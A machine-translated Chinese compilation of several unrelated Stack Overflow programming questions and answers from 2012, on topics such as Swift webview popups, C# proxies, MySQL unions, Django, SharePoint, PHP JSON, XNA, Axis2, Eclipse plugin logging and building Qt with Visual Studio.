但我使用的是 Swift 3。所以我只是从 taylorstine 的答案转换了下面的代码。

**斯威夫特 3。**

```
func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebViewNavigationType) -> Bool {

    if let _ = request.url?.absoluteString.range(of: "m.facebook.com" ) {
        if let _ = request.url?.absoluteString.range(of: "back"){
            self.popUp?.removeFromSuperview()
            self.popUp = nil
            return false
        }

        if let _ = self.popUp {
            return true
        }

        let wv = popUpWebView()
        wv.loadRequest(request)

        return false
    }

    return true
}

func popUpWebView() -> UIWebView {

    let webView = UIWebView(frame: self.view.frame)

    webView.delegate = self
    self.popUp = webView
    self.view.addSubview(webView)

    return webView
}

func webViewDidFinishLoad(_ webView: UIWebView) {
    if let _ = self.popUp {

        let jsFromFile = "window.close=function(){window.location.assign('back://' + window.location);};"

        let _ = webView.stringByEvaluatingJavaScript(from: jsFromFile)

        let openerContext = self.webView.value(forKeyPath: "documentView.webView.mainFrame.javaScriptContext") as! JSContext

        let popupContext = webView.value(forKeyPath: "documentView.webView.mainFrame.javaScriptContext") as! JSContext

        popupContext.setObject("opener", forKeyedSubscript: "window" as (NSCopying & NSObjectProtocol)!)
        popupContext.setObject(openerContext.objectForKeyedSubscript("window"), forKeyedSubscript: "opener"  as (NSCopying & NSObjectProtocol)!)

    }

    if webView == self.popUp
        && (webView.request?.url?.absoluteString.range(of:"m.facebook.com") != nil)
        && webView.stringByEvaluatingJavaScript(from: "document.body.innerHTML") == "" {

        webView.stringByEvaluatingJavaScript(from: "eval(document.getElementsByTagName('script')[0].text)")

    }

} 
```

# c# - 多线程的 C# HttpWebRequests 代理错误

> ID：13313227
> 
> 赞同：-1
> 
> 时间：2012-11-09T17:44:32.093
> 
> 标签：c#, proxy, httpwebrequest

我正在使用线程池进行多线程处理，每当我尝试启动我得到的请求时

```
Object reference not set to an instance of an object. 
```

上

```
Application.Run(new Form1()); 
```

没有代理我没有同样的问题

这是导致麻烦的代码

```
if (ProxyBox.Text != string.Empty)
{
     lock (locker)
     {
         Random rnd = new Random();
         int rndd = rnd.Next(0, int.Parse(ProxyNumber.Text));
         request.Proxy = new WebProxy(proxysplit[rndd].ToString());
     }
} 
```

基本上我想每次都从 proxysplit 数组中获取一个随机代理

有任何想法吗 ：？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T17:54:06.560

在我们为您提供帮助之前，您需要回答多个问题：

1.  错误发生在哪一行？
2.  指定的代理是否已初始化（即未初始化`null`）？
3.  再者，是否`proxysplit`初始化？

检查未初始化的内容，您可能还希望生成介于 0 和 中的元素数之间的随机数`proxysplit`：

```
if (ProxyBox.Text != string.Empty)
{
    lock (locker)
    {
        Random rnd = new Random();
        int rndd = rnd.Next(0, proxysplit.Length);
        request.Proxy = new WebProxy(proxysplit[rndd].ToString());
    }
} 
```

如果您使用 the`ProxyNumber`并且结果整数超出了`proxysplit`数组长度的范围，那么您在尝试访问超出范围的元素时也可能会遇到异常，即`ArgumentOutOfRangeException`.

# mysql - 从具有不同列名的两个表创建视图

> ID：13313229
> 
> 赞同：3
> 
> 时间：2012-11-09T17:44:33.963
> 
> 标签：mysql, view

有没有办法从两个表中创建一个视图，其中一个列在两个表中是不同的？我目前遇到的问题是 MYSQL 告诉我有一个`undefined index`- 这是非常有意义的，因为在一半的情况下，该列将不存在。

表布局：

```
(post_rank_activity)
ID, post_id, ... 日期

(reply_rank_activity)
ID, rank_id, ... 日期

```

我希望结果视图看起来像：

```
身份证 | Post_id | 回复ID | 日期
xx 空 x
x 空 xx

```

和 SQL：

```
$rankView = "Create or replace view userRank as (
select PRA.id, PRA.post_id, PRA.user_id, PRA.vote_up, PRA.rank_date
From post_rank_activity PRA)
union All
(select RRA.id, RRA.reply_id, RRA.user_id, RRA.vote_up, RRA.rank_date
from reply_rank_activity RRA)"; 
```

而我得到的结果，不是返回 null，而是`reply_id`为“ `post_id`”字段返回“”的值，然后将所有其他值转移过来——见下文：

```
身份证 | Post_id | 回复ID | 日期
xx 日期 val x
x 回复 val date val x

```

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T17:48:23.000

联合必须在所有部分中以相同的顺序包含相同的列。您应该在联合的每个部分显式选择/声明空列：

```
SELECT PRA.id, PRA.post_id, NULL AS reply_id, PRA.user_id, PRA.vote_up, PRA.rank_date
FROM post_rank_activity PRA
UNION All
SELECT RRA.id, NULL AS post_id, RRA.reply_id, RRA.user_id, RRA.vote_up, RRA.rank_date
FROM reply_rank_activity RRA 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T17:48:52.067

您的查询应如下所示

```
select PRA.id, PRA.post_id, null as Reply_id PRA.rank_date
From post_rank_activity PRA
union All
select RRA.id, null as post_id, RRA.reply_id, RRA.rank_date
from reply_rank_activity RRA 
```

# python - 如何在 python 代码中添加 mysql 查询 select distinct？

> ID：13313230
> 
> 赞同：-1
> 
> 时间：2012-11-09T17:44:34.773
> 
> 标签：python, mysql, django

我正在尝试从我的列/字段中显示不同或唯一的值`category`

函数来自`views.py`：

```
def category(request, book_category):
    latest_book_list = Books.objects.all().order_by('id')
    return render_to_response('books/category.html', {'latest_book_list': latest_book_list}) 
```

我想要这条线：`latest_book_list = Books.objects.all().order_by('id')`

要执行 mysql 查询： `mysql> select distinct category from books;`

我试过使用，`Books.objects.filter(category=book_category)`但它返回空白。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T20:37:14.987

尝试这个...

```
cateogries = Books.objects.values_list('category', flat=True).distinct()
latest_book_list = Books.objects.filter(category__id__in = categories) 
```

# javascript - 使用 SP2010 中的按钮更改页面，奇怪的行为

> ID：13313247
> 
> 赞同：2
> 
> 时间：2012-11-09T17:45:28.487
> 
> 标签：javascript, sharepoint, sharepoint-2010, onclick, window.location

我正在尝试在 Sharepoint 2010 中做一些应该非常简单的事情，创建一个更改页面的按钮（当它发生时变为“创建新项目”表单）。

我设置了一个内容编辑器 Webpart 并在其中放置了一个按钮（不是在表单中，因为在 Sharepoint 中整个页面都是一个表单），并带有一个更改 windows.location.href 的“onclick”处理程序。

在 2010 年，当您尝试输入重要的 HTML 时，CEWP 会与您发生争执，它会不断转义诸如“&”之类的字符，这可能会很痛苦。但是最后我输入了正确的内容。

它不起作用（页面只是在不更改 URL 的情况下自行刷新）。通过检查 StackOverflow，我发现了一些关于 CEWP 内容更健壮形式的建议，最终结果为 -

```
<script type="text/javascript">
    function submit_rec(){
       window.location.href = "<my server root URL>/Lists/Rec/NewForm.aspx";
       return;
    }
    </script>
<button onclick="javascript:return submit_rec();return false"/>Submit a Recommendation</button> 
```

这是奇怪的部分。

如果我使用 Firebug 并在 submit_rec() 函数中放置一个断点，这可以正常工作。但是没有断点，它又回到了总是返回当前页面的行为。

似乎有时间问题，或者在我的 URL 开始加载后 Sharepoint 正在控制，并再次重新加载原始页面！

有人以前见过这个并找到了解决方案吗？

想法和建议将不胜感激。

问候： colin_e

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T12:48:08.893

感谢大家的回应。通过更多的实验，并遵循 Stackoverflow 上其他线程的提示，我终于能够让它工作。

我上次使用 Sharepoint 内置**OpenNewFormUrl()**函数的错误是期望这将是 SP 在中央库中定义的全局函数。事实证明不是，它必须在使用它的每个页面上单独定义，部分原因是它硬编码了库编辑表单的弹出框的大小。

（是的，这很丑陋，就像很多 Sharepoint 一样，反正我跑题了……）

我能够使用内容编辑器 WebPart 中的以下代码，使用与标准 SP 文档中心“提交文档”按钮样式相同的按钮来使用 Sharepoint 2010 样式的“弹出”编辑器。我不知道该脚本的详细作用，我只是从文档中心站点模板主页复制它-

```
<script type="text/javascript">

// <![CDATA[
function ULS18u(){var o=new Object;o.ULSTeamName="DLC Server";o.ULSFileName="default.aspx";return o;}
var navBarHelpOverrideKey = "wssmain";
// ]]>

function OpenNewFormUrl(url)
{ULS18u:;
var options = {width:640, height:720};
SP.UI.ModalDialog.commonModalDialogOpen(url, options, null, null);
}

</script>

<div class="ms-uploadbtnlink">
 <button onclick="javascript:OpenNewFormUrl(&#39;/dev/KfD/KfDdev/Lists/Recommendation/NewForm.aspx&#39;);return false;" type="submit"><nobr><img alt="Submit a Recommendation" src="/_layouts/Images/uploaddoc.png"/>&#160;<span>Submit a Recommendation</span></nobr>
 </button>
</div> 
```

如果（比如说）用户屏幕小于硬编码的弹出窗口大小，我很担心这会做什么，而且我仍然对为什么我之前（而且更简单）的努力失败感到困惑，但至少我有一个可行的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T08:16:45.937

尝试这个：

```
javascript:SP.UI.ModalDialog.OpenPopUpPage('/dev/KfD/KfDdev/Lists/Recommendation/New‌​Form.aspx');return false; 
```

在 onclick 事件中

# php - 无法从 PHP 中的 JSON 访问“@attributes”：“obj->@attribute”

> ID：13313249
> 
> 赞同：0
> 
> 时间：2012-11-09T17:45:34.253
> 
> 标签：php, json, syntax-error

> **可能重复：**
> [PHP/JSON - stdClass 对象](https://stackoverflow.com/questions/3754411/php-json-stdclass-object)

我有这个 JSON 响应：

```
{
    "findItemsIneBayStoresResponse": {
        "ack": "Success",
        "version": "1.12.0",
        "timestamp": "2012-11-09T17:14:20.543Z",
        "searchResult": {
            "@attributes": {
                "count": "1"
            },
            "item": {
                "itemId": "160884918999",
                "topRatedListing": "false"
            }
        },
        "paginationOutput": {
            "totalPages": "1",
            "totalEntries": "1",
            "pageNumber": "1",
            "entriesPerPage": "100"
        }
    }
} 
```

我正在尝试使用 PHP 访问“@attributes”中的“计数”。我认为`if ($decoded->findItemsIneBayStoresResponse->searchResult->@attributes->count > 1) {`会工作，但我得到了错误：

`Parse error: syntax error, unexpected '@', expecting T_STRING or T_VARIABLE or '{' or '$' in /home/ancienta/public_html/category.php on line 40`

我能做些什么？

# graphics - 我的 3D 简笔画的某些部分无法呈现

> ID：13313253
> 
> 赞同：0
> 
> 时间：2012-11-09T17:45:44.057
> 
> 标签：graphics, 3d, xna

我正在用 C# 开发基于 Microsoft XNA 框架 4.0 的 3D 游戏。为了显示 3D 简笔画，我使用了像 cylinder.fbx 这样的网格并像这样加载它 this.cylinderMesh = this.Game.Content.Load("Meshes\Cylinder"); 但问题是，当我转动简笔画时，某些部分无法显示。我在这里发布我的截图：

![在此处输入图像描述](../Images/81558f881c9b945a0075c1f884513671.png)

我认为这可能与相机距离有关，导致后面的某些部分无法显示。我的猜测是对的还是问题出在哪里？

# axis2 - 如何将传输动态添加到 Axis2 服务？

> ID：13313255
> 
> 赞同：0
> 
> 时间：2012-11-09T17:45:51.397
> 
> 标签：axis2

我在 HTTPS 中公开了一个 Axis2 服务。我想将 HTTP 传输动态添加到服务中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:45:51.397

您可以简单地动态添加传输，如下所示，

```
axisService.addExposedTransport("http"); 
```

# exception-handling - 处理 Eclipse 插件的检查异常

> ID：13313261
> 
> 赞同：0
> 
> 时间：2012-11-09T17:45:58.767
> 
> 标签：exception-handling, eclipse-plugin

我正在开发一个 Eclipse 插件，并且面临着从我在插件中使用的 API 抛出的检查异常。在插件上下文中处理此类异常的做法是什么？我无法从插件开发 API 中找到合适的异常子类。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:02:25.507

我使用在 Eric Clayberg 和 Dan Rubel 的名为“Eclipse Plug-ins”的书中找到的日志记录类。

这是主要的日志记录类。

```
import org.eclipse.core.runtime.IStatus;
import org.eclipse.core.runtime.Plugin;
import org.eclipse.core.runtime.Status;

public class EclipseLogging {

    public static void logInfo(Plugin plugin, String pluginID, String message,
            boolean display) {
        log(plugin, pluginID, IStatus.INFO, IStatus.OK, message, null, display);
    }

    public static void logInfo(Plugin plugin, String pluginID,
            Throwable exception) {
        log(plugin, createStatus(pluginID, IStatus.ERROR, IStatus.OK,
                "Unexpected Exception", exception));
    }

    public static void logInfo(Plugin plugin, String pluginID, String message,
            Throwable exception) {
        log(plugin, createStatus(pluginID, IStatus.ERROR, IStatus.OK, message,
                exception));
    }

    public static void logError(Plugin plugin, String pluginID,
            Throwable exception) {
        logError(plugin, pluginID, "Unexpected Exception", exception);
    }

    public static void logError(Plugin plugin, String pluginID, String message,
            Throwable exception) {
        log(plugin, pluginID, IStatus.ERROR, IStatus.OK, message, exception,
                true);
    }

    public static void log(Plugin plugin, String pluginID, int severity,
            int code, String message, Throwable exception, boolean display) {
        if (display) {
            ExceptionAction action = new ExceptionAction(plugin, message,
                    exception);
            action.run();
        }
        log(plugin, createStatus(pluginID, severity, code, message, exception));
    }

    public static IStatus createStatus(String pluginID, int severity, int code,
            String message, Throwable exception) {
        return new Status(severity, pluginID, code, message, exception);
    }

    public static void log(Plugin plugin, IStatus status) {
        plugin.getLog().log(status);
    }
} 
```

这是异常操作类。

```
import org.eclipse.core.runtime.Plugin;
import org.eclipse.jface.action.Action;
import org.eclipse.swt.SWTException;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.ui.IWorkbench;
import org.eclipse.ui.IWorkbenchWindow;
import org.eclipse.ui.PlatformUI;

public class ExceptionAction extends Action {

    private Plugin plugin;
    private String message;
    private Throwable exception;

    public ExceptionAction(Plugin plugin, String message, Throwable exception) {
        this.plugin = plugin;
        this.message = message;
        this.exception = exception;
    }

    public void run() {
        IWorkbench workbench = PlatformUI.getWorkbench();
        IWorkbenchWindow window = workbench.getActiveWorkbenchWindow();

        if (window != null) {
            Shell parentShell = window.getShell();
            parentShell.forceActive();
            try {
                ExceptionDetailsDialog dialog = new ExceptionDetailsDialog(
                        parentShell, null, null, message, exception, plugin);
                dialog.open();
            } catch (SWTException e) {
            }
        }
    }
} 
```

最后，显示异常的类。

```
import org.eclipse.jface.dialogs.Dialog;
import org.eclipse.jface.dialogs.IDialogConstants;
import org.eclipse.jface.window.IShellProvider;
import org.eclipse.jface.window.SameShellProvider;
import org.eclipse.swt.SWT;
import org.eclipse.swt.graphics.Image;
import org.eclipse.swt.graphics.Point;
import org.eclipse.swt.graphics.Rectangle;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Button;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Control;
import org.eclipse.swt.widgets.Label;
import org.eclipse.swt.widgets.Shell;

/**
 * An abstract dialog with a details section that can be shown or hidden by the
 * user. Subclasses are responsible for providing the content of the details
 * section.
 */
public abstract class AbstractDetailsDialog extends Dialog {

    private final String title;

    private final String message;

    private final Image image;

    private Button detailsButton;

    private Control detailsArea;

    private Point cachedWindowSize;

    /**
     * Construct a new instance with the specified elements. Note that the
     * window will have no visual representation (no widgets) until it is told
     * to open. By default, <code>open</code> blocks for dialogs.
     * 
     * @param parentShell
     *            the parent shell, or <code>null</code> to create a top-level
     *            shell
     * @param title
     *            the title for the dialog or <code>null</code> for none
     * @param image
     *            the image to be displayed
     * @param message
     *            the message to be displayed
     */
    public AbstractDetailsDialog(Shell parentShell, String title, Image image,
            String message) {
        this(new SameShellProvider(parentShell), title, image, message);
    }

    /**
     * Construct a new instance with the specified elements. Note that the
     * window will have no visual representation (no widgets) until it is told
     * to open. By default, <code>open</code> blocks for dialogs.
     * 
     * @param parentShell
     *            the parent shell provider (not <code>null</code>)
     * @param title
     *            the title for the dialog or <code>null</code> for none
     * @param image
     *            the image to be displayed
     * @param message
     *            the message to be displayed
     */
    public AbstractDetailsDialog(IShellProvider parentShell, String title,
            Image image, String message) {
        super(parentShell);

        this.title = title;
        this.image = image;
        this.message = message;

        setShellStyle(SWT.DIALOG_TRIM | SWT.RESIZE | SWT.APPLICATION_MODAL);
    }

    /**
     * Configures the given shell in preparation for opening this window in it.
     * In our case, we set the title if one was provided.
     */
    protected void configureShell(Shell shell) {
        super.configureShell(shell);
        if (title != null)
            shell.setText(title);
    }

    /**
     * Creates and returns the contents of the upper part of this dialog (above
     * the button bar). This includes an image, if specified, and a message.
     * 
     * @param parent
     *            the parent composite to contain the dialog area
     * @return the dialog area control
     */
    protected Control createDialogArea(Composite parent) {
        Composite composite = (Composite) super.createDialogArea(parent);
        composite.setLayoutData(new GridData(GridData.FILL_HORIZONTAL));

        if (image != null) {
            ((GridLayout) composite.getLayout()).numColumns = 2;
            Label label = new Label(composite, 0);
            image.setBackground(label.getBackground());
            label.setImage(image);
            label.setLayoutData(new GridData(GridData.HORIZONTAL_ALIGN_CENTER
                    | GridData.VERTICAL_ALIGN_BEGINNING));
        }

        Label label = new Label(composite, SWT.WRAP);
        if (message != null)
            label.setText(message);
        GridData data = new GridData(GridData.FILL_HORIZONTAL
                | GridData.VERTICAL_ALIGN_CENTER);
        data.widthHint = convertHorizontalDLUsToPixels(IDialogConstants.MINIMUM_MESSAGE_AREA_WIDTH);
        label.setLayoutData(data);
        label.setFont(parent.getFont());

        return composite;
    }

    /**
     * Adds OK and Details buttons to this dialog's button bar.
     * 
     * @param parent
     *            the button bar composite
     */
    protected void createButtonsForButtonBar(Composite parent) {
        createButton(parent, IDialogConstants.OK_ID, IDialogConstants.OK_LABEL,
                false);
        detailsButton = createButton(parent, IDialogConstants.DETAILS_ID,
                IDialogConstants.SHOW_DETAILS_LABEL, false);
    }

    /**
     * The buttonPressed() method is called when either the OK or Details
     * buttons is pressed. We override this method to alternately show or hide
     * the details area if the Details button is pressed.
     */
    protected void buttonPressed(int id) {
        if (id == IDialogConstants.DETAILS_ID)
            toggleDetailsArea();
        else
            super.buttonPressed(id);
    }

    /**
     * Toggles the unfolding of the details area. This is triggered by the user
     * pressing the Details button.
     */
    protected void toggleDetailsArea() {
        Point oldWindowSize = getShell().getSize();
        Point newWindowSize = cachedWindowSize;
        cachedWindowSize = oldWindowSize;

        // Show the details area.
        if (detailsArea == null) {
            detailsArea = createDetailsArea((Composite) getContents());
            detailsButton.setText(IDialogConstants.HIDE_DETAILS_LABEL);
        }

        // Hide the details area.
        else {
            detailsArea.dispose();
            detailsArea = null;
            detailsButton.setText(IDialogConstants.SHOW_DETAILS_LABEL);
        }

        /*
         * Must be sure to call getContents().computeSize(SWT.DEFAULT,
         * SWT.DEFAULT) before calling getShell().setSize(newWindowSize) since
         * controls have been added or removed.
         */

        // Compute the new window size.
        Point oldSize = getContents().getSize();
        Point newSize = getContents().computeSize(SWT.DEFAULT, SWT.DEFAULT);
        if (newWindowSize == null)
            newWindowSize = new Point(oldWindowSize.x, oldWindowSize.y
                    + (newSize.y - oldSize.y));

        // Crop new window size to screen.
        Point windowLoc = getShell().getLocation();
        Rectangle screenArea = getContents().getDisplay().getClientArea();
        final int pos = screenArea.height - (windowLoc.y - screenArea.y);
        if (newWindowSize.y > pos)
            newWindowSize.y = pos;

        getShell().setSize(newWindowSize);
        ((Composite) getContents()).layout();
    }

    /**
     * subclasses must implement createDetailsArea to provide content for the
     * area of the dialog made visible when the Details button is clicked.
     * 
     * @param parent
     *            the details area parent
     * @return the details area
     */
    protected abstract Control createDetailsArea(Composite parent);
}

import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.InvocationTargetException;
import java.text.MessageFormat;
import java.util.Dictionary;

import org.eclipse.core.runtime.CoreException;
import org.eclipse.core.runtime.IStatus;
import org.eclipse.core.runtime.Plugin;
import org.eclipse.jface.dialogs.IDialogConstants;
import org.eclipse.jface.window.IShellProvider;
import org.eclipse.jface.window.SameShellProvider;
import org.eclipse.swt.SWT;
import org.eclipse.swt.graphics.Image;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Control;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Label;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.swt.widgets.Text;

/**
 * A dialog to display one or more errors to the user, as contained in an
 * <code>IStatus</code> object along with the plug-in identifier, name, version
 * and provider. If an error contains additional detailed information then a
 * Details button is automatically supplied, which shows or hides an error
 * details viewer when pressed by the user.
 * 
 * @see org.eclipse.core.runtime.IStatus
 */
public class ExceptionDetailsDialog extends AbstractDetailsDialog {
    /**
     * The details to be shown ({@link Exception}, {@link IStatus}, or
     * <code>null</code> if no details).
     */
    private final Object details;

    /**
     * The plugin triggering this details dialog and whose information is to be
     * shown in the details area or <code>null</code> if no plugin details
     * should be shown.
     */
    private final Plugin plugin;

    /**
     * Construct a new instance with the specified elements. Note that the
     * window will have no visual representation (no widgets) until it is told
     * to open. By default, <code>open</code> blocks for dialogs.
     * 
     * @param parentShell
     *            the parent shell, or <code>null</code> to create a top-level
     *            shell
     * @param title
     *            the title for the dialog or <code>null</code> for none
     * @param image
     *            the image to be displayed
     * @param message
     *            the message to be displayed
     * @param details
     *            an object whose content is to be displayed in the details
     *            area, or <code>null</code> for none
     * @param plugin
     *            The plugin triggering this deatils dialog and whose
     *            information is to be shown in the details area or
     *            <code>null</code> if no plugin details should be shown.
     */
    public ExceptionDetailsDialog(Shell parentShell, String title, Image image,
            String message, Object details, Plugin plugin) {
        this(new SameShellProvider(parentShell), title, image, message,
                details, plugin);
    }

    /**
     * Construct a new instance with the specified elements. Note that the
     * window will have no visual representation (no widgets) until it is told
     * to open. By default, <code>open</code> blocks for dialogs.
     * 
     * @param parentShell
     *            the parent shell provider (not <code>null</code>)
     * @param title
     *            the title for the dialog or <code>null</code> for none
     * @param image
     *            the image to be displayed
     * @param message
     *            the message to be displayed
     * @param details
     *            an object whose content is to be displayed in the details
     *            area, or <code>null</code> for none
     * @param plugin
     *            The plugin triggering this deatils dialog and whose
     *            information is to be shown in the details area or
     *            <code>null</code> if no plugin details should be shown.
     */
    public ExceptionDetailsDialog(IShellProvider parentShell, String title,
            Image image, String message, Object details, Plugin plugin) {
        super(parentShell, getTitle(title, details), getImage(image, details),
                getMessage(message, details));

        this.details = details;
        this.plugin = plugin;
    }

    /**
     * Build content for the area of the dialog made visible when the Details
     * button is clicked.
     * 
     * @param parent
     *            the details area parent
     * @return the details area
     */
    protected Control createDetailsArea(Composite parent) {

        // Create the details area.
        Composite panel = new Composite(parent, SWT.NONE);
        panel.setLayoutData(new GridData(GridData.FILL_BOTH));
        GridLayout layout = new GridLayout();
        layout.marginHeight = 0;
        layout.marginWidth = 0;
        panel.setLayout(layout);

        // Create the details content.
        createProductInfoArea(panel);
        createDetailsViewer(panel);

        return panel;
    }

    /**
     * Create fields displaying the plugin information such as name, identifer,
     * version and vendor. Do nothing if the plugin is not specified.
     * 
     * @param parent
     *            the details area in which the fields are created
     * @return the product info composite or <code>null</code> if no plugin
     *         specified.
     */
    protected Composite createProductInfoArea(Composite parent) {

        // If no plugin specified, then nothing to display here
        if (plugin == null)
            return null;

        Composite composite = new Composite(parent, SWT.NULL);
        composite.setLayoutData(new GridData());
        GridLayout layout = new GridLayout();
        layout.numColumns = 2;
        layout.marginWidth = convertHorizontalDLUsToPixels(IDialogConstants.HORIZONTAL_MARGIN);
        composite.setLayout(layout);

        Dictionary<?, ?> bundleHeaders = plugin.getBundle().getHeaders();
        String pluginId = plugin.getBundle().getSymbolicName();
        String pluginVendor = (String) bundleHeaders.get("Bundle-Vendor");
        String pluginName = (String) bundleHeaders.get("Bundle-Name");
        String pluginVersion = (String) bundleHeaders.get("Bundle-Version");

        new Label(composite, SWT.NONE).setText("Provider:");
        new Label(composite, SWT.NONE).setText(pluginVendor);
        new Label(composite, SWT.NONE).setText("Plug-in Name:");
        new Label(composite, SWT.NONE).setText(pluginName);
        new Label(composite, SWT.NONE).setText("Plug-in ID:");
        new Label(composite, SWT.NONE).setText(pluginId);
        new Label(composite, SWT.NONE).setText("Version:");
        new Label(composite, SWT.NONE).setText(pluginVersion);

        return composite;
    }

    /**
     * Create the details field based upon the details object. Do nothing if the
     * details object is not specified.
     * 
     * @param parent
     *            the details area in which the fields are created
     * @return the details field
     */
    protected Control createDetailsViewer(Composite parent) {
        if (details == null)
            return null;

        Text text = new Text(parent, SWT.MULTI | SWT.READ_ONLY | SWT.BORDER
                | SWT.H_SCROLL | SWT.V_SCROLL);
        text.setLayoutData(new GridData(GridData.FILL_BOTH));

        // Create the content.
        StringWriter writer = new StringWriter(1000);
        if (details instanceof Throwable)
            appendException(new PrintWriter(writer), (Throwable) details);
        else if (details instanceof IStatus)
            appendStatus(new PrintWriter(writer), (IStatus) details, 0);
        text.setText(writer.toString());

        return text;
    }

    // /////////////////////////////////////////////////////////////////
    //
    // Utility methods for building content
    //
    // /////////////////////////////////////////////////////////////////

    /**
     * Answer the title based on the provided title and details object.
     */
    public static String getTitle(String title, Object details) {
        if (title != null)
            return title;
        if (details instanceof Throwable) {
            Throwable e = (Throwable) details;
            while (e instanceof InvocationTargetException)
                e = ((InvocationTargetException) e).getTargetException();
            String name = e.getClass().getName();
            return name.substring(name.lastIndexOf('.') + 1);
        }
        return "Exception";
    }

    /**
     * Answer the image based on the provided image and details object.
     */
    public static Image getImage(Image image, Object details) {
        if (image != null)
            return image;
        Display display = Display.getCurrent();
        if (details instanceof IStatus) {
            switch (((IStatus) details).getSeverity()) {
            case IStatus.ERROR:
                return display.getSystemImage(SWT.ICON_ERROR);
            case IStatus.WARNING:
                return display.getSystemImage(SWT.ICON_WARNING);
            case IStatus.INFO:
                return display.getSystemImage(SWT.ICON_INFORMATION);
            case IStatus.OK:
                return null;
            }
        }
        return display.getSystemImage(SWT.ICON_ERROR);
    }

    /**
     * Answer the message based on the provided message and details object.
     */
    public static String getMessage(String message, Object details) {
        if (details instanceof Throwable) {
            Throwable e = (Throwable) details;
            while (e instanceof InvocationTargetException)
                e = ((InvocationTargetException) e).getTargetException();
            if (message == null)
                return e.toString();
            return MessageFormat.format(message, new Object[] { e.toString() });
        }
        if (details instanceof IStatus) {
            String statusMessage = ((IStatus) details).getMessage();
            if (message == null)
                return statusMessage;
            return MessageFormat
                    .format(message, new Object[] { statusMessage });
        }
        if (message != null)
            return message;
        return "An Exception occurred.";
    }

    public static void appendException(PrintWriter writer, Throwable ex) {
        if (ex instanceof CoreException) {
            appendStatus(writer, ((CoreException) ex).getStatus(), 0);
            writer.println();
        }
        appendStackTrace(writer, ex);
        if (ex instanceof InvocationTargetException)
            appendException(writer, ((InvocationTargetException) ex)
                    .getTargetException());
    }

    public static void appendStatus(PrintWriter writer, IStatus status,
            int nesting) {
        for (int i = 0; i < nesting; i++)
            writer.print("  ");
        writer.println(status.getMessage());
        IStatus[] children = status.getChildren();
        for (int i = 0; i < children.length; i++)
            appendStatus(writer, children[i], nesting + 1);
    }

    public static void appendStackTrace(PrintWriter writer, Throwable ex) {
        ex.printStackTrace(writer);
    }

} 
```

# windows - Qt 4.8.3 Windows 7 使用 Visual Studio Express 2012 编译

> ID：13313262
> 
> 赞同：1
> 
> 时间：2012-11-09T17:46:11.117
> 
> 标签：windows, qt, qt4, nmake

我还是 Qt 的新手。过去，我曾经在计算机上下载 Qt 并毫无问题地安装它，并且我可以立即访问所有 Qt SDK 资源，包括 QtCreator。

现在，我下载了 Qt SDK 4.8.3，并在阅读后最终安装了 Windows SDK 7。然后我将 Qt 文件解压缩到 C:\Qt。我还将 C:\Qt\4.8.3\ 添加到系统路径。然后我运行了configure，结果没有错误。然后我尝试运行`nmake`失败并出现以下错误：

> 正在生成代码...链接 /LIBPATH:"c:\Qt\4.8.3\lib" /LIBPATH:"c:\Qt\4.8.3\lib" /NOLOGO /DYNAMICBASE /NXCOMPAT /BASE:0x67000000 /DEBUG /DLL /MANIFEST /MANIFESTFILE:"tmp\obj\debug_shared\QtCored.intermediate.manifest" /VERSION:4.83 /OUT:....\lib\QtCored4.dll @C:\Users\MELKAM~1\AppData\Local\Temp \nm5A03.tmp
> 创建库 ....\lib\QtCored4.lib 和对象 ....\lib\QtCored4.exp 链接：致命错误 LNK1123：转换为 COFF 时失败：文件无效或损坏
> 
> NMAKE：致命错误 U1077：'"C:\Program Files (x86)\Microsoft Visual Studio 10.0 \VC\Bin\amd64\link.EXE"'：返回代码 '0x463' 停止。NMAKE：致命错误 U1077：'"C:\Program Files (x86)\Microsoft Visual Studio 10.0 \VC\Bin\amd64\nmake.exe"'：返回代码 '0x2' 停止。NMAKE：致命错误 U1077：“cd”：返回代码“0x2”停止。

现在我已经尝试了上述两次没有运气。任何指针我应该在哪里看？任何建议表示赞赏。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T18:15:11.503

你在用什么编译？MSVC 还是 mingw？如果是前者，我发现此链接非常有用... [http://www.holoborodko.com/pavel/2011/02/01/how-to-compile-qt-4-7-with-visual-studio- 2010/](http://www.holoborodko.com/pavel/2011/02/01/how-to-compile-qt-4-7-with-visual-studio-2010/)

我已经多次按照他的 64 位和 32 位构建说明进行操作。

编辑：您已为 MSVC2010 (1600) 构建配置了 qt 构建，因此它在“C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\Bin\amd64\nmake.exe”目录中查找，它没有如果您只有 MSVC2012（版本 11.0），则不存在。

[Qt 4.8 还没有正式支持 MSVC2012](http://qt-project.org/doc/qt-4.8/supported-platforms.html)（还没有？），但是如果你真的想使用 2012 那么你可以试试[这个链接](https://stackoverflow.com/questions/10863466/how-to-set-visual-studio-2012-rc-compiler-for-qt-instead-of-mingw)的建议。这很复杂，特别是如果这是您的第一个源代码构建，但如果您愿意修补 Qt 源代码，它似乎是可行的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-28T09:55:45.543

我遇到过同样的问题。问题是在装有 Visual Studio 2010 的机器上安装 Visual Studio 2012。这可能会有所帮助[https://stackoverflow.com/a/15132209/1933829](https://stackoverflow.com/a/15132209/1933829)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:13:26.780

